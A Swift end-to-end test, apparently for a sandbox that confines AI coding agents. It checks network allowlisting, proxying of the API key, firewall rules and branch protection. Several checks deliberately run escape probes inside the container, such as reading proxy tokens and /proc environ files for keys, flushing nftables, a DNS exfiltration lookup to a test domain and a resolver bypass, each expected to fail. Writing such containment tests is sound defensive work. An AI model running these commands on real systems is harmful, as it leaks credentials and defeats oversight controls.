import AirlockCore
import AirlockDocker
import AirlockEngine
import AirlockProviders
import AirlockRuntime
import Foundation

/// Drives a real task through the engine and checks each layer from outside.
enum EndToEnd {
    static func run(runtime docker: any ContainerRuntime, scratch: URL, mode: WorkspaceSpec.Mode, restricted: Bool) async throws {
        let root = scratch.appending(path: "e2e-\(Int(Date().timeIntervalSince1970))")
        let repo = root.appending(path: "repo")
        try FileManager.default.createDirectory(at: repo, withIntermediateDirectories: true)
        for cmd in [["init", "-q", "-b", "main"], ["config", "user.name", "AIrlock Test"], ["config", "user.email", "test@example.invalid"]] {
            try await ProcessRunner.run("/usr/bin/git", ["-C", repo.path] + cmd)
        }
        try "hello\n".write(to: repo.appending(path: "README.md"), atomically: true, encoding: .utf8)
        // A dependency for the sealed setup to download (scripts off) before the network closes.
        try #"{"name":"e2e","version":"1.0.0","dependencies":{"is-number":"7.0.0"}}"#.write(to: repo.appending(path: "package.json"), atomically: true, encoding: .utf8)
        try await ProcessRunner.run("/usr/bin/git", ["-C", repo.path, "add", "."])
        try await ProcessRunner.run("/usr/bin/git", ["-C", repo.path, "commit", "-qm", "init"])

        let engine = TaskEngine(
            paths: Paths(root: root.appending(path: "support")),
            // A dummy value: the agent starts but can't authenticate, which is enough here.
            // A GitHub token is set, but the task doesn't opt in, so the agent must not get it.
            secrets: InMemorySecretStore([.anthropicAPIKey: "dummy-not-a-key", .githubToken: "dummy-github-token"]),
            runtimes: [docker.kind: docker]
        )
        let logTask = Task {
            for await update in engine.updates {
                switch update {
                case .task(let t): print("· \(t.lifecycle.displayName) / \(t.activity)")
                case .attention(_, let e): print("! attention: \(e.summary)")
                default: break
                }
            }
        }
        defer { logTask.cancel() }

        let task = try await engine.create(NewTaskRequest(
            title: "E2E check", prompt: "Say hello", repoPath: repo.path, baseRef: "main", runtime: docker.kind,
            workspaceMode: mode, network: restricted ? .restricted(extraDomains: []) : .open
        ))
        try await waitFor("running", timeout: 600) {
            let t = await engine.task(task.id)
            if case .failed(let m)? = t?.lifecycle { throw EngineError(m) }
            return t?.lifecycle == .running
        }
        let t = await engine.task(task.id)!
        let id = t.containerID!
        print("container \(id.prefix(16)) branch \(t.workspace.branch)")

        func sh(_ cmd: String, user: String = "node") async throws -> ExecResult {
            try await docker.exec(id, ExecSpec(["sh", "-c", cmd], user: user, workdir: "/workspace"))
        }
        func check(_ name: String, _ ok: Bool, _ detail: String = "") {
            print("\(ok ? "PASS" : "FAIL") \(name)\(detail.isEmpty ? "" : " — \(detail)")")
        }

        let setup = await engine.task(task.id)?.sealing
        check("sealed setup ran before the agent", setup?.report != nil && setup?.sealedAt != nil, setup?.report?.summary ?? "no report")
        let installed = try await sh("test -f node_modules/is-number/package.json && echo yes")
        check("dependencies installed during setup", installed.output.contains("yes"), installed.errorOutput)
        let registry = try await sh("curl -sS -m 5 -o /dev/null https://registry.npmjs.org")
        check("registry closed while the agent works", registry.exitCode != 0, "exit \(registry.exitCode)")
        // That refusal was this check's own doing.
        await engine.ignoreBlockedHosts(task.id, ["registry.npmjs.org"])
        let who = try await sh("id -un")
        check("runs as node", who.output.trimmingCharacters(in: .whitespacesAndNewlines) == "node")
        let status = try await sh("git status --short --branch")
        check("git works in /workspace", status.exitCode == 0, status.output.split(separator: "\n").first.map(String.init) ?? status.errorOutput)
        if status.exitCode != 0 {
            let diag = try await sh("cat /workspace/.git; d=$(sed 's/gitdir: //' /workspace/.git); ls -la \"$d\" \"$d/../..\" 2>&1 | head -30; grep -E 'virtiofs|/workspace' /proc/mounts", user: "root")
            print(diag.output, diag.errorOutput)
        }
        let tmux = try await sh("sleep 4; tmux has-session -t agent && tmux capture-pane -p -t agent | grep -v '^\\s*$' | tail -3")
        check("agent tmux session", tmux.exitCode == 0, tmux.output.trimmingCharacters(in: .whitespacesAndNewlines))
        let caps = try await sh("grep CapEff /proc/self/status")
        check("node has no capabilities", caps.output.contains("0000000000000000"), caps.output.trimmingCharacters(in: .whitespacesAndNewlines))

        if restricted {
            let blocked = try await sh("curl -sS -m 5 -o /dev/null -w '%{http_code} %{remote_ip}' https://example.com")
            check("example.com blocked", blocked.exitCode != 0, "exit \(blocked.exitCode) \(blocked.output) \(blocked.errorOutput.trimmingCharacters(in: .whitespacesAndNewlines))")
            // The API key never reaches the agent: a proxy, as its own user, adds it.
            let direct = try await sh("curl -sS -m 8 -o /dev/null https://api.anthropic.com")
            check("the agent can't reach the API itself", direct.exitCode != 0, "exit \(direct.exitCode)")
            let viaProxy = try await sh("curl -sS -m 15 -o /dev/null -w '%{http_code}' -I http://127.0.0.1:8119/api/hello")
            check("the API is reachable through the proxy", viaProxy.output.hasPrefix("2"), viaProxy.output + viaProxy.errorOutput)
            if !viaProxy.output.hasPrefix("2") {
                let diag = try await sh("ps -eo user,args | grep -i proxy; ls -la /run/airlock-proxy; nft list ruleset | grep -v elements | head -40", user: "root")
                print(diag.output, diag.errorOutput)
            }
            let refusedPath = try await sh("curl -sS -m 8 -o /dev/null -w '%{http_code}' http://127.0.0.1:8119/v1/organizations")
            check("the proxy passes only the agent's API paths", refusedPath.output == "403", refusedPath.output)
            let secret = try await sh("cat /run/airlock-proxy/token 2>&1; for p in $(pgrep -u node -f claude); do tr '\\0' '\\n' < /proc/$p/environ | grep '^ANTHROPIC_API_KEY='; done | sort -u; grep -l dummy-not-a-key /proc/*/environ 2>/dev/null")
            check("the key isn't readable in the container", !secret.output.contains("dummy-not-a-key") && secret.output.contains("Permission denied")
                  && secret.output.contains("ANTHROPIC_API_KEY=sk-ant-api03-airlock-proxy-placeholder"), secret.output.trimmingCharacters(in: .whitespacesAndNewlines))
            let github = try await sh("curl -sS -m 5 -o /dev/null -w '%{http_code}' https://github.com")
            check("github.com blocked without GitHub access", github.exitCode != 0, "exit \(github.exitCode)")
            // That refusal was this check's own doing; don't leave it for the agent's turn.
            try await waitFor("github.com reported", timeout: 20) { await engine.task(task.id)?.blockedHosts.contains { $0.name == "github.com" } == true }
            await engine.ignoreBlockedHosts(task.id, ["github.com"])
            let token = try await sh("tmux show-environment -t agent GH_TOKEN 2>&1; grep -rl dummy-github-token ~/.claude /proc/*/environ 2>/dev/null")
            check("no GitHub token in the agent's session", !token.output.contains("dummy-github-token") && !token.output.contains("environ"),
                  token.output.trimmingCharacters(in: .whitespacesAndNewlines))
            let flush = try await sh("nft flush ruleset")
            check("node can't change firewall", flush.exitCode != 0, flush.errorOutput.trimmingCharacters(in: .whitespacesAndNewlines))

            // Blocked hosts are reported, and allowing one takes effect without a restart.
            try await waitFor("example.com reported blocked", timeout: 20) {
                await engine.task(task.id)?.blockedHosts.contains { $0.name == "example.com" } == true
            }
            check("blocked host reported", true)
            let change = try await engine.setAllowedHosts(task.id, add: ["example.com", "no-such-host.invalid"])
            check("allow applies live", change.applied && change.unresolved == ["no-such-host.invalid"], "\(change)")
            let stillBlocked = await engine.task(task.id)?.blockedHosts.map(\.name) ?? []
            check("nothing else reported blocked", stillBlocked.isEmpty, stillBlocked.joined(separator: ", "))
            let reachable = try await sh("curl -sS -m 10 -o /dev/null -w '%{http_code}' https://example.com")
            check("allowed host reachable without restart", reachable.exitCode == 0, reachable.output + reachable.errorOutput)
            let exfil = try await sh("dig +time=3 +tries=1 secret-42.exfil-test.example A | grep -o 'status: [A-Z]*'")
            check("DNS refuses names not on the allowlist", exfil.output.contains("NXDOMAIN"), exfil.output + exfil.errorOutput)
            // That refusal was this check's own doing.
            try await waitFor("exfil probe reported", timeout: 20) { await engine.task(task.id)?.blockedHosts.contains { $0.name.hasSuffix("exfil-test.example") } == true }
            await engine.ignoreBlockedHosts(task.id, ["secret-42.exfil-test.example"])
            _ = try await engine.setAllowedHosts(task.id, add: ["*.amazonaws.com"])
            let wildcard = try await sh("curl -sS -m 15 -o /dev/null -w '%{http_code}' https://s3.amazonaws.com")
            check("*.amazonaws.com lets s3.amazonaws.com through", wildcard.exitCode == 0, wildcard.output + wildcard.errorOutput)
            _ = try await engine.setAllowedHosts(task.id, remove: ["amazonaws.com"])
            let bypass = try await sh("dig +time=2 +tries=1 @$(head -1 /run/airlock/upstream-dns) example.com A")
            check("agent can't skip the logging resolver", bypass.exitCode != 0 || !bypass.output.contains("ANSWER SECTION"), "exit \(bypass.exitCode)")
            _ = try await engine.setAllowedHosts(task.id, remove: ["no-such-host.invalid"])
        } else {
            let timing = try await sh("for u in https://api.anthropic.com https://github.com https://example.com https://api.anthropic.com; do curl -sS -m 30 -o /dev/null -w \"$u connect=%{time_connect} tls=%{time_appconnect} total=%{time_total} %{http_code}\\n\" $u; done; ip link show eth0 | head -1")
            print(timing.output, timing.errorOutput)
            let open = try await sh("curl -sS -m 10 -o /dev/null -w '%{http_code}' https://example.com")
            check("open network reaches example.com", open.exitCode == 0, open.output)
        }

        // Let the real agent submit its prompt first, so simulated events come after it.
        try await waitFor("agent prompt", timeout: 60) { await engine.events(for: task.id).contains { $0.kind == .prompt } }
        // The dummy key can't authenticate: the turn must end as a failure, not hang as "working".
        try await waitFor("API error reported", timeout: 60) { await engine.events(for: task.id).contains { $0.kind == .stopFailure } }
        let failed = await engine.snapshot(task.id, includeMessage: false)
        check("bad credentials fail the task", failed?.status == "failed" && failed?.statusDetail?.hasPrefix("Authentication failed") == true,
              "\(failed?.status ?? "nil"): \(failed?.statusDetail ?? "")")
        // Simulate the agent: edit a file, commit, and fire hook events.
        _ = try await sh("echo change >> README.md && echo new > NEW.txt && git add -A && git commit -qm 'agent change'")
        _ = try await sh("echo '{\"hook_event_name\":\"PreToolUse\",\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"npm test\"}}' | airlock-hook PreToolUse")
        _ = try await sh("echo '{\"hook_event_name\":\"Stop\"}' | airlock-hook Stop")
        try await waitFor("hook events", timeout: 10) { await engine.events(for: task.id).contains { $0.kind == .stop } }
        let events = await engine.events(for: task.id)
        check("events decoded", events.contains { $0.summary == "Bash npm test" }, events.map(\.summary).joined(separator: " | "))
        let activity = await engine.task(task.id)!.activity
        check("activity is ready", { if case .idle = activity { true } else { false } }(), "\(activity)")

        // Chat hand-off loop: wait returns while the agent waits, and a reply reaches its session.
        let waited = await engine.waitForUpdate(task.id, afterEventID: nil, timeout: .seconds(5))
        check("wait_for_task returns when the turn ends", waited?.status == "ready", waited?.status ?? "nil")
        let progress = await engine.progress(task.id, after: nil)
        check("watch sees the turn end", progress?.ended == true, "\(String(describing: progress))")
        let beforeSend = await engine.events(for: task.id).last?.id ?? -1
        try await engine.sendMessage(task.id, "Reply from the parent chat")
        try await Task.sleep(for: .seconds(1))
        let pane = try await sh("tmux capture-pane -p -t agent -S -50")
        check("send_message reaches the agent", pane.output.contains("Reply from the parent chat"))
        // With the dummy key the agent may already have answered with another auth error.
        let afterSend = await engine.snapshot(task.id, includeMessage: false)
        let failedAgain = await engine.events(for: task.id).contains { $0.id > beforeSend && $0.kind == .stopFailure }
        check("agent marked working after a message", afterSend?.status == "working" || (afterSend?.status == "failed" && failedAgain),
              afterSend?.status ?? "nil")

        // The agent can't move the user's branches, whatever it does to its own refs.
        let mainBefore = try await ProcessRunner.run("/usr/bin/git", ["-C", repo.path, "rev-parse", "main"]).output
        _ = try await sh("git update-ref refs/heads/main HEAD")
        let mainAfter = try await ProcessRunner.run("/usr/bin/git", ["-C", repo.path, "rev-parse", "main"]).output
        check("agent can't move the user's main branch", mainBefore == mainAfter, "\(mainBefore.prefix(8)) → \(mainAfter.prefix(8))")

        let changes = try await engine.changes(task.id)
        check("changes visible", changes.files.map(\.path).sorted() == ["NEW.txt", "README.md"] && changes.commits.count == 1,
              changes.files.map { "\($0.kind) \($0.path)" }.joined(separator: ", "))

        // Nothing reaches the user's repository until the work is handed off.
        let early = try await ProcessRunner.run("/usr/bin/git", ["-C", repo.path, "rev-parse", "--verify", "--quiet", t.workspace.branch], check: false)
        check("nothing in your repository before handoff", early.status != 0, early.output)
        let review = try await engine.handoffReview(task.id)
        check("handoff review lists the work", review.commits.count == 1 && review.files == 2 && !review.nothingNew,
              "\(review.summary); flagged \(review.attention.map(\.path))")
        try await engine.handOff(task.id)
        let log = try await ProcessRunner.run("/usr/bin/git", ["-C", repo.path, "log", "--format=%s", "-1", t.workspace.branch])
        check("handed off: the commit is on your branch", log.output == "agent change", log.output)
        check("nothing new after handoff", try await engine.handoffReview(task.id).nothingNew)

        // The base branch moves on: the running agent is asked to merge, and once it has,
        // the diff is the task's own again.
        try "upstream\n".write(to: repo.appending(path: "UPSTREAM.txt"), atomically: true, encoding: .utf8)
        for cmd in [["add", "UPSTREAM.txt"], ["commit", "-qm", "upstream change"]] {
            try await ProcessRunner.run("/usr/bin/git", ["-C", repo.path] + cmd)
        }
        let ahead = await engine.baseUpdates(task.id)
        let update = try await engine.updateFromBase(task.id)
        check("base branch update offered and sent to the agent", ahead == 1 && update == .askedAgent(1), "ahead \(ahead), \(update)")
        let tip = try await ProcessRunner.run("/usr/bin/git", ["-C", repo.path, "rev-parse", "main"]).output
        let merged = try await sh("git -c user.name=A -c user.email=a@example.invalid merge -q --no-edit \(tip) && ls UPSTREAM.txt")
        let afterMerge = try await engine.changes(task.id)
        check("diff is the task's own after the merge", merged.exitCode == 0 && !afterMerge.files.map(\.path).contains("UPSTREAM.txt")
              && afterMerge.files.map(\.path).contains("NEW.txt"), afterMerge.files.map(\.path).joined(separator: ", ") + merged.errorOutput)

        // Terminal attach: read a screenful.
        let session = try await engine.openTerminal(task.id, size: TerminalSize(cols: 100, rows: 30))
        var received = Data()
        let reader = Task {
            for await chunk in session.output {
                received.append(chunk)
                if received.count > 4_000_000 { break }
            }
            return received
        }
        try await Task.sleep(for: .seconds(3))
        try await session.resize(TerminalSize(cols: 120, rows: 40))
        // The app forwards the scroll wheel as mouse wheel events. The agent's full-screen UI asks for
        // them itself; a plain shell doesn't, so tmux scrolls its own history. Check the tmux path in a
        // window with history (the attached client shows whichever window is active).
        let agentMouse = try await sh("tmux display -p -t agent '#{mouse_any_flag}'")
        print("  agent requests mouse events: \(agentMouse.output.trimmingCharacters(in: .whitespacesAndNewlines))")
        _ = try await sh("tmux new-window -t agent 'seq 1 300; exec sleep 600' && sleep 1")
        try await session.write(Data(String(repeating: "\u{1B}[<64;10;5M", count: 6).utf8))
        try await Task.sleep(for: .seconds(1))
        let scrolled = try await sh("tmux display -p -t agent '#{pane_in_mode} #{scroll_position}'")
        check("wheel up scrolls tmux history one line per event", scrolled.output.trimmingCharacters(in: .whitespacesAndNewlines) == "1 5",
              "in copy mode, position: \(scrolled.output.trimmingCharacters(in: .whitespacesAndNewlines))")
        try await session.write(Data(String(repeating: "\u{1B}[<65;10;5M", count: 10).utf8))
        try await Task.sleep(for: .seconds(1))
        let back = try await sh("tmux display -p -t agent '#{pane_in_mode}'; tmux kill-window -t agent")
        check("wheel down to the bottom leaves copy mode", back.output.trimmingCharacters(in: .whitespacesAndNewlines) == "0", back.output)
        // OSC 52 from a program inside tmux reaches the app's terminal, which puts it on the clipboard.
        _ = try await sh("tmux new-window -t agent \"printf '\\033]52;c;%s\\a' $(printf airlock-copy | base64); exec sleep 600\" && sleep 1; tmux kill-window -t agent")
        try await Task.sleep(for: .seconds(1))
        reader.cancel()
        let screen = await reader.value
        let clipboard = Data("airlock-copy".utf8).base64EncodedString()
        check("OSC 52 copy passes through tmux", String(decoding: screen, as: UTF8.self).contains("52;c;\(clipboard)") || String(decoding: screen, as: UTF8.self).contains(clipboard))
        await session.close()
        check("terminal attach streams output", screen.count > 0, "\(screen.count) bytes")

        await engine.stop(task.id)
        check("stop", await engine.task(task.id)?.lifecycle == .stopped)
        await engine.start(task.id)
        try await waitFor("restart", timeout: 60) { await engine.task(task.id)?.lifecycle == .running }
        let resumed = try await sh("tmux has-session -t agent")
        check("start resumes agent session", resumed.exitCode == 0)
        if restricted {
            let kept = try await sh("curl -sS -m 10 -o /dev/null -w '%{http_code}' https://example.com")
            check("allowed host still reachable after restart", kept.exitCode == 0, kept.output + kept.errorOutput)
            _ = try await engine.setAllowedHosts(task.id, remove: ["example.com"])
            let blockedAgain = try await sh("curl -sS -m 5 -o /dev/null https://example.com")
            check("removed host blocked again", blockedAgain.exitCode != 0, "exit \(blockedAgain.exitCode)")
        }

        try await engine.remove(task.id)
        check("removed", (try? await docker.state(id)) == .missing)
        try? FileManager.default.removeItem(at: root)
    }

    static func waitFor(_ what: String, timeout: Double, _ condition: () async throws -> Bool) async throws {
        let deadline = Date().addingTimeInterval(timeout)
        while Date() < deadline {
            if try await condition() { return }
            try await Task.sleep(for: .milliseconds(500))
        }
        throw EngineError("Timed out waiting for \(what)")
    }
}
